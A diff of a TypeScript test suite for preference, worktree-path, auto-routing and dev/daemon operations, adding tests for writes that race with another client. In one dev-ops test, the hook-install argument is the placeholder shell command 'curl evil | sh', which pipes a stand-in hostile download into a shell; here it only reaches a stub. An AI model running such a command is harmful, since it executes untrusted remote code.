@@ -30,7 +30,7 @@ function prefs(initial: State = {}) {
   const s = store(initial)
   const deps: PrefsDeps = {
     load: s.load,
-    patch: s.patch,
+    update: (compute: (fresh: State) => State) => s.patch(compute(s.state)),
     themes: () => [{ name: "claude", bundled: true, theme: BUNDLED_THEME_JSONS.claude as never }],
   }
   return { s, ops: createPrefsOps(deps) }
@@ -51,7 +51,6 @@ describe("prefs.get", () => {
       focusAccent: "primary",
       glyphSet: "braille",
       railFold: "glyphs",
-      tabRowHeight: 1,
       taskColors: "on",
       runningTitle: "shimmer",
       workingBorder: "flow",
@@ -77,12 +76,11 @@ describe("prefs.get", () => {
   test("stale or hand-edited values read through the normalizers, as the TUI would", async () => {
     const { ops } = prefs({
       "appearance.glyphSet": "emoji",
-      "sidebar.tabRowHeight": "2",
       "chat.tabStrip.hideSingle": true,
       locale: "fr",
     })
     const r = (await call(ops, "prefs.get")) as { prefs: State }
-    expect(r.prefs).toMatchObject({ glyphSet: "braille", tabRowHeight: 2, tabStrip: "multipleOnly", locale: "en" })
+    expect(r.prefs).toMatchObject({ glyphSet: "braille", tabStrip: "multipleOnly", locale: "en" })
   })
 })
 
@@ -114,7 +112,6 @@ describe("prefs.set", () => {
       { key: "scrollbackRows", value: 50 },
       { key: "scrollbackRows", value: 1000.5 },
       { key: "soundVolume", value: 0.33 },
-      { key: "tabRowHeight", value: "2" },
     ]) {
       await expect(call(ops, "prefs.set", args)).rejects.toMatchObject({ code: "BAD_ARGS" })
     }
@@ -153,6 +150,26 @@ describe("prefs.set", () => {
     expect(r.info.worktreeCustomPath).toBe("/srv/trees")
   })
 
+  test("leaving a custom worktree base remembers the path on disk now, not the one read before another client changed it", async () => {
+    const s = store({ "worktree.basePath": "/srv/old", "worktree.basePath.custom": "/srv/old" })
+    // Another client changes the base after this op's first read of state, before its write.
+    let raced = false
+    const deps: PrefsDeps = {
+      load: () => ({ ...s.state }),
+      update: (compute) => {
+        if (!raced) {
+          raced = true
+          s.state["worktree.basePath"] = "/srv/new"
+          s.state["worktree.basePath.custom"] = "/srv/new"
+        }
+        s.patch(compute(s.state))
+      },
+      themes: () => [{ name: "claude", bundled: true, theme: BUNDLED_THEME_JSONS.claude as never }],
+    }
+    await call(createPrefsOps(deps), "prefs.set", { key: "worktreeBase", value: "default" })
+    expect(s.state).toMatchObject({ "worktree.basePath": "", "worktree.basePath.custom": "/srv/new" })
+  })
+
   test("the custom editor command is only reported as set, never read back or written", async () => {
     const { ops, s } = prefs({ "editor.customCommand": "code -w {file}" })
     await call(ops, "prefs.set", { key: "editorKind", value: "custom" })
@@ -183,11 +200,15 @@ describe("theme.taskColors", () => {
   })
 })
 
-function routing(initial: State = {}) {
+/** `beforeWrite` runs inside the locked update, as another client's write landing after the op's first read. */
+function routing(initial: State = {}, beforeWrite: (state: State) => void = () => {}) {
   const s = store(initial)
   const deps = {
     load: s.load,
-    patch: s.patch,
+    update: (compute: (fresh: State) => State) => {
+      beforeWrite(s.state)
+      s.patch(compute({ ...s.state }))
+    },
     installed: async () => [],
     statuses: async () => [{ vendor: "claude", account: { kind: "none" } }],
     integrations: () => [],
@@ -251,6 +272,23 @@ describe("autoRouting", () => {
       "autoRouting.classifierEndpoint": "https://tiers.internal/pick",
     })
   })
+
+  test("leaving custom remembers the endpoint on disk now, not one another client replaced after the op began", async () => {
+    const { ops, s } = routing(
+      {
+        "autoRouting.classifier": "https://old.internal/pick",
+        "autoRouting.classifierEndpoint": "https://old.internal/pick",
+      },
+      (state) => {
+        state["autoRouting.classifier"] = "https://new.internal/pick"
+      },
+    )
+    await call(ops, "autoRouting.setClassifier", { mode: "off" })
+    expect(s.state).toMatchObject({
+      "autoRouting.classifier": "off",
+      "autoRouting.classifierEndpoint": "https://new.internal/pick",
+    })
+  })
 })
 
 describe("dev ops", () => {
@@ -260,21 +298,13 @@ describe("dev ops", () => {
       installHooks: async () => void seen.push("install"),
       uninstallHooks: async () => void seen.push("uninstall"),
       resetState: () => void seen.push("reset"),
+      restartDaemon: async () => void seen.push("restart"),
     })
     await call(ops, "engines.hooks.install", { command: "curl evil | sh" })
     await call(ops, "engines.hooks.uninstall")
-    const rpcs: unknown[] = []
-    await (ops["dev.reset"] as NonNullable<OpTable[string]>).run(
-      {},
-      { api: { verb: api.verb, rpc: async (name, payload) => void rpcs.push([name, payload]) as never } },
-    )
-    expect(seen).toEqual(["install", "uninstall", "reset"])
-    expect(rpcs).toEqual([["daemon.stop", { reason: "restart" }]])
-    rpcs.length = 0
-    await (ops["daemon.restart"] as NonNullable<OpTable[string]>).run(
-      {},
-      { api: { verb: api.verb, rpc: async (name, payload) => void rpcs.push([name, payload]) as never } },
-    )
-    expect(rpcs).toEqual([["daemon.stop", { reason: "restart" }]])
+    await call(ops, "dev.reset")
+    await call(ops, "daemon.restart")
+    // Both restart through the lock-holding restart, not a bare stop another client's build could answer.
+    expect(seen).toEqual(["install", "uninstall", "reset", "restart", "restart"])
   })
 })
